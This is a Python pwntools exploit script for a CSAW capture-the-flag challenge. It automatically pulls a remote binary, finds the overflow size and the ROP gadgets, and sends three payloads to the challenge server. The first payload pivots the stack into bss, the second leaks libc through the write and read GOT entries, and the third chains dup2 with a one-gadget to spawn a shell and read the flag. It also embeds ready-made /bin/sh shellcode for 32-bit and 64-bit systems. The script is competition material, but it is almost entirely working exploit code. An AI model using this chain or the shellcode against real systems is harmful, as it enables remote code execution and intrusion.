#!/usr/bin/env python
from ropper import RopperService
from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './program_name'
#binary = ELF(program_name)

remote_server = 'pwn.chal.csaw.io'
PORT = 8888

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    caca = 1

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        p = process(program_name)

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

def get_gadgets():
    options = {'color' : False,     # if gadgets are printed, use colored output: default: False
            'badbytes': '00',   # bad bytes which should not be in addresses or ropchains; default: ''
            'all' : False,      # Show all gadgets, this means to not remove double gadgets; default: False
            'inst_count' : 6,   # Number of instructions in a gadget; default: 6
            'type' : 'all',     # rop, jop, sys, all; default: all
            'detailed' : False} # if gadgets are printed, use detailed output; default: False

    rs = RopperService(options)
    arch = 'x86_64'
    bin_name = 'bin'
    rs.addFile(bin_name, bytes=open('bin_4','rb').read(), raw=True, arch=arch)
    rs.options.badbytes = ''
    rs.options.all = True
    rs.loadGadgetsFor()
    rs.options.type = 'rop'
    rs.loadGadgetsFor()
    gags = []
    for i in rs.search(search='pop rsi', name=bin_name):
        gags.append(i)
    for i in rs.search(search='leave', name=bin_name):
        gags.append(i)
    for i in rs.search(search='pop rdi', name=bin_name):
        gags.append(i)

    return gags

def unp_multiple(leak, arch=None):
    data = []
    for i in range( len(leak)/arch ):
        data.append(hex(u64( leak[i*arch : (i+1)*arch] )))
    return data

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    ver = 1

    while ver:
        p = remote(remote_server, PORT)
        file_name_binar = 'remote_binary'
        f = open(file_name_binar,'w')

        # get the port number for the new binary
        PORT2 = int(p.recvline().strip()[6:])

        # read the binary
        flag = 1
        data = ''
        while flag:
            try:
                data += p.recv()
            except:
                flag = 0
        f.write(data)

        data = data.encode('hex')
        offset = data.find('e8ddfdffff')

        # find the size of the read function
        if offset == -1:
            offset = data.find('e8e3fdffff')
            print 'OFF=',offset
            sizee = int('0x'+data[offset-30+2:offset-30+4],16)
            print 'SIZE',sizee
        else:
            print 'OFF=',offset
            sizee = int('0x'+data[offset-30+2:offset-30+4],16)
            print 'SIZE',sizee

        # make sure that the size is big enough for us to pwn the binary
        if sizee >= 192:
            # find the size of the buffer
            buffer = int('0x'+data[3830+6:3830+8],16)
            # make sure that the buffer is small enough for us to pwn the binary (the smaller the buffer, the bigger the overflow)
            if sizee >= buffer + 0x28:

                import os
                os.system('chmod +x '+file_name_binar)
                f.close()

                # read data from binary (PLT / GOT)
                e = ELF(file_name_binar)
                base_elf = e.address
                read_got = e.got['read']
                read_plt = e.plt['read']
                write_plt = e.plt['write']
                if write_plt % 0x10 != 0:
                    write_plt += 0xf - (write_plt % 0x10) + 0x1
                print 'WRITE PLT=',hex(write_plt)
                print 'READ GOT=',hex(read_got)
                print 'READ PLT=',hex(read_plt)

                # find Gadgets inside the binary
                gag = str(get_gadgets()).split("'x86_64', [(")
                pop_rsi = base_elf + int(gag[1][:4])
                leave = base_elf + int(gag[2][:4])
                pop_rdi = base_elf + int(gag[3][:4])
                print 'POP RDI=',pop_rdi
                print 'LEAVE=',leave
                print 'POP_RSI=',hex(pop_rsi)

                r = remote(remote_server,PORT2)
                rbp = 0x6010c0
                if e.read(0x00400848,1) == '\xe8' and e.read(0x0040084a,3) == '\xfd\xff\xff':
                    read_main = 0x00400848
                else:
                    read_main = 0x0040084e

                # PAYLOAD1
                # perform another read inside the bss and pivot the stack over there
                rop = p64(rbp) + p64(pop_rsi) + p64(0x6010c8) + p64(0xdeadbeef) + p64(read_plt) + p64(leave) # pivot to bss and perform another read
                payload = cyclic(buffer-0x10) + p64(6) + p64(0xcafebabe) + rop
                print 'PAYLOAD1::',payload.encode('hex')
                r.send(payload)

                r.recv()

                # PAYLOAD2
                # Leak libc and perform another read in the .bss
                payload2 = p64(pop_rsi) + p64(read_got) + p64(0xcafecafecafecafe) + p64(write_plt) + p64(pop_rsi) + p64(0x601108) + p64(0xaaaaaaaa) + p64(read_plt)
                print 'PAYLOAD2::',payload2.encode('hex')
                r.send(payload2)

                # libc leak
                libc_base = int(unp_multiple(r.recv(),8)[0],16)-0x000000000110070
                print 'LEAK LIBC BASE=',libc_base

                one_gag = [0x4f322,0x10a38c]
                dup2 = libc_base + 0x0000000001109a0
                gadget = libc_base + one_gag[1]

                # PAYLOAD3
                # perform dup2(6,0) dup2(6,1) system('/bin/sh')
                ropchain2 = p64(pop_rdi) + p64(6) + p64(pop_rsi) + p64(0) + p64(0xbbbb) + p64(dup2) + p64(pop_rsi) + p64(1) + p64(0xbbbb) + p64(dup2) + p64(gadget)
                r.sendline(ropchain2)

                # get FLAG
                r.sendline('cat ./flag.txt')
                r.interactive()

                ver = 0

                r.close()
                p.close()

        else:
            print 'Size',sizee,'is too small'
            p.close()
            f.close()



    # ============ GDB =========== #
    #gdb.attach(p)


# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
'''
 flag{autobots_will_return}
'''